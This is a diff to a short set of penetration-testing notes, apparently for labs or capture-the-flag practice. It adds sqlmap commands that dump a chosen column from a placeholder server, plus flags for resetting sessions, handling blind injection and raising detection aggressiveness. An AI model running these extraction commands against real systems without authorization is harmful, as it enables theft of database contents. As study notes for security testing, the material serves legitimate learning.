@@ -30,6 +30,13 @@ SQLmap
 1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
 2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
 3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> --dump`
+4. 3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> -C <column> --dump`
+
+`--flush-session` to start again
+
+`--no-cast` to ensure correct data is gotten from blind sql
+
+`--risk=3` for more aggressive SQLi detection
 
 Other stuff
 - Check SSL cert
